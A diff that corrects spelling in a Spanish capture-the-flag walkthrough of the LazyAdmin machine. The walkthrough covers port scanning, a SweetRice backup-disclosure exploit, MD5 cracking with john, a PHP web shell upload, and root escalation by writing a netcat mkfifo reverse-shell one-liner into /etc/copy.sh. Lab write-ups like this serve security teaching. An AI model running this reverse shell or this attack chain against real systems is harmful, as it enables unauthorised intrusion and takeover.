@@ -13,7 +13,7 @@ published : True
 <img src="/imgs/lazyAdmin/lazyAdmin0.jpg"/>
 <br>
 <br>
-`Vemos que es una maquina linux por el ttl que es de 63, por proximidad hacia 64 podemos decir que la maquina es linux.`
+`Vemos que es una maquina Linux por el ttl que es de 63, por proximidad hacia 64 podemos decir que la maquina es Linux.`
 * <p>Empezamos con el reconocimiento de puertos.</p>
 > nmap --min-rate 5000 -sV -sS -Pn --open 10.10.56.176 -o ports
 <img src="/imgs/lazyAdmin/lazyAdmin1.jpg"/>
@@ -25,7 +25,7 @@ published : True
 <img src="/imgs/lazyAdmin/lazyAdmin2.jpg"/>
 <br>
 <br>
-`Vemos que hay un direcotorio llamado content.`
+`Vemos que hay un directorio llamado content.`
 * <p>Miremos que trae ese directorio.</p>
 <img src="/imgs/lazyAdmin/lazyAdmin3.jpg"/>
 <br><br>
@@ -33,16 +33,16 @@ published : True
 * <p>Miremos si tiene vulnerabilidades el sistema que tiene en uso.</p>
 > searchsploit sweetrice
 <img src="/imgs/lazyAdmin/lazyAdmin4.jpg"/>
-* <p>Mirando bien tenemos un exploit llamado Backup Disclosure que recopila informacion, de una base de datos mySql.</p>
+* <p>Mirando bien tenemos un exploit llamado Backup Disclosure que recopila información, de una base de datos mySql.</p>
 <img src="/imgs/lazyAdmin/lazyAdmin5.jpg"/>
 <br><br>
-`Lo que podemos observer es que hay una base de datos filtrada en una url en este caso http://localhost/inc/mysql_backup`
+`Lo que podemos observe es que hay una base de datos filtrada en una url en este caso http://localhost/inc/mysql_backup`
 * Veamos si existe el archivo filtrado.\
 <br>
 <img src="/imgs/lazyAdmin/lazyAdmin6.jpg"/>
 <br><br>
-`Ahora si vemos el archivo descargado podemos ver que hay un usario llamado "manager" y la cotraseña encrytada en MD5`
-<p>Por cierto pense en la gente y desarrolle este <font color="red">exploit</font> el cual te automatiza todo.</p>
+`Ahora si vemos el archivo descargado podemos ver que hay un usuario llamado "manager" y la contraseña encriptada en MD5`
+<p>Por cierto pensé en la gente y desarrolle este <font color="red">exploit</font> el cual te automatiza todo.</p>
 
 ```bash
 #!/bin/bash
@@ -117,26 +117,26 @@ init $1
 <img src="/imgs/lazyAdmin/lazyAdmin7.jpg"/>
 <br><br>
 <p>Vemos el usuario y la contraseña....jejej.</p>
-* <p>Ahora desencryptemos el hash anteriormente.</p>
+* <p>Ahora desencriptar el hash anteriormente.</p>
 > john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 <img src="/imgs/lazyAdmin/lazyAdmin8.jpg"/>
 <br><br>
-<p>contraseña mas debil jejeje.</p>
-<p>Ahora ya podemo ingresar al login de la pagina web.</p>
+<p>contraseña mas débil jejeje.</p>
+<p>Ahora ya podemos ingresar al login de la pagina web.</p>
 <img src="/imgs/lazyAdmin/lazyAdmin9.jpg"/>
 <p>Ahora nos vamos al apartado de anuncios.</p>
 <img src="/imgs/lazyAdmin/lazyAdmin10.jpg"/>
-<p>Ahora solo colocamos un codigo php que me de una web shell. </p>
+<p>Ahora solo colocamos un codigo php que me de una web Shell. </p>
 <img src="/imgs/lazyAdmin/lazyAdmin11.jpg"/>
 * <p>Ahora vamos a la url, donde se cargo el archivo php en este caso es en  <font color="yellow">http://localhost/content/inc/ads/( nombre de archivo).php</font></p>
 <img src="/imgs/lazyAdmin/lazyAdmin12.jpg"/>
-* <p>Nos ponemos en escucha en nuestra terminal y recargamos la pagina web anterior, de esta forma ganaremos una web shell</p>
+* <p>Nos ponemos en escucha en nuestra terminal y recargamos la pagina web anterior, de esta forma ganaremos una web Shell</p>
 <img src="/imgs/lazyAdmin/lazyAdmin13.jpg"/>
 * <p>Enumeramos el sistema para ver como podemos escalar privilegios.</p>
 <img src="/imgs/lazyAdmin/lazyAdmin14.jpg"/>
 <br><br>
 `En la imagen podemos ver que tenemos permisos para ejecutar perl, un archivo llamado /home/itguy/backuo.pl que a su vez ejecuta otro archivo llamado /etc/copy.sh el cual vemos que tenemos permisos de escritura`
-* Como el archivo /etc/copy.sh, en su contexto vemos que el archivo tiene una estructura para lanzar una seudo consola por una ip y un puerto, lo que hare sera remplzar la ip y el puerto y ejecutar el archivo.
+* Como el archivo /etc/copy.sh, en su contexto vemos que el archivo tiene una estructura para lanzar una seudo consola por una ip y un puerto, lo que haré sera remplazar la ip y el puerto y ejecutar el archivo.
 > echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TuIp 5555 >/tmp/f"  > /etc/copy.sh
 <img src="/imgs/lazyAdmin/lazyAdmin15.jpg"/>
 <p>OK maquina vulnerada.</p>
